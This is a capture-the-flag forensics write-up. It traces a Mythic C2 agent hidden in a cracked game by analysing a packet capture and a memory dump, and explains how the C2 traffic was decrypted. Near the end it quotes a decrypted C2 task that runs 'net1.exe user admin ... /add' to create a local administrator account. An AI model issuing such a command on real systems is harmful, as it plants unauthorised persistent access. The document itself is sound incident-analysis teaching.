# 🔥 Red Alert 🔥
Solved by odin, jallajalla85

## Challenge
Author: LOLASL

> Those idiots from IT Security claim I have created a "Red Alert" with my C2 traffic. They wanted my computer, but I am unable to comply (building in progress). Told them that it is called C&C and gave them a pcap and a memdump. Silos needed, unit lost, leave me alone!

*Hint: The flag is in the packet capture but you probably need something from the memory dump to retrieve it.*

## Writeup
We first started looking into the given PCAP since the flag should be located there. Doing a quick triage, we find some interesting HTTP traffic in the fifth TCP
stream. Using Wireshark, the stream was saved as an text file in _c2.txt_, and hopefully will be used for later.

The request below shows the first HTTP request in the stream:
```
POST /data HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Host: 192.168.77.136
Content-Length: 1224
Expect: 100-continue
Connection: Keep-Alive

ZjY3YzkxYjMtZTU5YS00ZDIyLWFhZjctOThiNTQ1N2ZmZTY4A39u8L0jOYVF2xipz+XuHwYOTmQTYTZgmMJx+HDaCo2PUp+JDqIW+56cScWbbgHQmQ9SSnov/XnwmEvl0ndxa4btiUe3YmG7w/VK5qNRvyypSRMdCNgcTFzHSm7qL0F6yohRf+b97ONj0u3Cq7sdMbf16aLM7nqpL1rUTJtCNR7B0C5qUqh8hPK+AO4OsBgS8VwYv1F8VXpm9cVhZ7DhU2tiSGF9Ov1qezfcfoKsEmNNedHAYmvy2nAnwfcXq7oLqG8Q2pg143Ov2Vz53q8uVWIAN+DAwEcoU8eTvkO6SMp7TmGWBcVMVebEUDu2DRaGHyTIiQ5RAPn15GCeGGbrRzh6TPFD7wKR1RDHlZvVbZSf9RDTjaVLeb2KFtSmdf+pb6nUo5SY3UpXpXU1qyKmY0c6DUUKWqeT8xflB71T6lpmNGByPsQKD/xg3GWIAOuIqi2rSEhWdt9Owdw5wZskDwt6/UAjheJI8YJ6/UZIBanTiUxKD9kCjK6zXX73sQGX/3b6hr8XMmJMSKWugUnpCNEe8+kWktt/it7BgPQ6W4CGfEE2yvEEtSjDiwZcSKD0WImravgFz7WIXAX6r2D7WyI1dMDhidSoenhgFvDnNgznxQj25cktUMkhSZkIdsCpxL+61a0XoTBdoH+PJKSNNF+wRjoRyddfeBgAjpCTwgMnMw19Ff+H19VtbMsJ1bqSUEWlOPjozIIMkoab4JanNHA0lnX+YhnHf7JNZBf55NNu9ognQIpttOxmeadtPzR+YVbUM2pO1qWNOH8DzTk/5/NGyAk6hBJVGiIQkRI7QTtsi7z0WOTdjCDPOB6VvjojIXiSkCPKFFpehXwKmjq98livuYnQPWtIcIZKNiJMthokV6JrjHWJvyYgGuwT0xDtaOKTNhxMUsD7XCXQ5q/x2XFnzfHZKqFs2ewCcNE8Yt+8bf5JK1060a/HIf/aZtfrQ7iHa0aU5qr3WZSkU5cn4JgOglPzhyfRCZ2dUdRZjEd5AsEE4lVuRNZuTAh1q7DWfs2jvST7EnMQKin9NBQz7d7O4S1LTXvu7BbVc7C/NlInms1I8nNWJZUfBHopAaOwDrJ6fooLUtF9hPWFXiCSGmEkDGj+T8neyVRLj7wDgu+ux3t49g/bN3FwkHfjLEvnKEe2awk66/ZZJw6hwSNycw==
```

Decoding the base64 string results in mostly gibberish data, but the first part is actually a readable UUID, f67c91b3-e59a-4d22-aaf7-98b5457ffe68. Our early assumption is that the flag is located in this HTTP stream, and we need to find out how this data is constructed. 

Moving over to the memory dump, a quick triage was performed using volatility3 (pslist and dumping of executables). The process with PID 1420 did stick out due to the process name, and when dumping the executable, we see that the full name of the application is Command.and.Conquer.RedAlert-CRACKED-EPT24.exe. Listing network connections for this process shows an established connection to the same IP address as the interesting HTTP request.

```
vol -f DESKTOP-R7UTVNN-20240930-180346.raw windows.netscan | grep Command.and.Co
0x68f66543a20  TCPv4   192.168.77.174  49794   104.26.7.148    443     ESTABLISHED     1420    Command.and.Co  2024-09-30 18:03:20.000000 UTC
0xe68f66626920  TCPv4   192.168.77.174  49795   172.253.116.94  80      ESTABLISHED     1420    Command.and.Co  2024-09-30 18:03:21.000000 UTC
0xe68f66d9aa20  TCPv4   192.168.77.174  49796   192.168.77.136  80      ESTABLISHED     1420    Command.and.Co  2024-09-30 18:03:27.000000 UTC
```
Since the connection was established it was good chances that a lot of memory artifacts still persisted in the memory related to these network connections. To get a fast overview, the process memory of PID 1420 was dumped, `vol -f DESKTOP-R7UTVNN-20240930-180346.raw windows.pslist --pid 1420 --dump`, then generating a new file including all the strings in the dump, `strings pid.1420.dmp > pid.1420.dmp.str && strings -el pid.1420.dmp >> pid.1420.dmp.str`. In the string files we started searching for the IOCs we have found, and from the UUID located above we found the following:

```json
{

    action: "checkin",
    architecture: "x64",
    decryption_key: null,
    domain: "DESKTOP-R7UTVNN",
    encryption_key: null,
    external_ip: "",
    host: "DESKTOP-R7UTVNN",
    integrity_level: 3,
    ips: [
        "192.168.77.174",
        "fe80::b89:6d7:7c0f:4834%7"
    ],
    os: "Windows 10 Pro 2009 6.2.9200.0",
    pid: 1420,
    process_name: "Command.and.Conquer.RedAlert-CRACKED-EPT24",
    pub_key: null,
    session_id: null,
    user: "Westwood",
    uuid: "f67c91b3-e59a-4d22-aaf7-98b5457ffe68"

}
```

Doing some Google search based on fields identified in this JSON blob, we found out that this is related to the [Mythic](https://docs.mythic-c2.net/) C2 framework. 
Based on Mythic documentation and what we see in memory, we had an idea of how their protocol worked:

* Client generates RSA keys during initialization.
* Public key forwarded to C2 server during `staging_rsa`.
* All messages are AES encrypted, but the UUID is kept in cleartext (what we see from the PCAP above).
* AES encryption settings:
    + Padding: PKCS7, block size of 16
    + Mode: CBC
    + IV is 16 random bytes
    + Final message: IV + Ciphertext + HMAC (SHA256 with the same AES key over (IV + Ciphertext))
* The C2 server sends a new AES key in the `staging_rsa` response, and the key is encrypted with the public RSA key of the client.
* Client decrypts this with its private key, and uses the new AES key.

The keys was found by searching in the process memory:
* [RSA key](rsa_key.pem) found based on its header. 
* AES key was found based on a short base64 string that did not fit into any other parts of the protocol.

The actual solution can be found in [solve.py](solve.py), and one of the JSON respones includes the flag.
```json
    action: "get_tasking",
    responses: [],
    tasks: [
        {
            timestamp: 1727719493,
            command: "run",
            parameters: "{\"executable\": \"cmd.exe\", \"arguments\": \" /S /c net1.exe user admin \\"EPT{should_have_played_brood_war_instead}\\" /add /y\"}",
            id: "24fd09e8-a81e-47f1-ac33-19237680e9c8"
        }
    ]

}
```
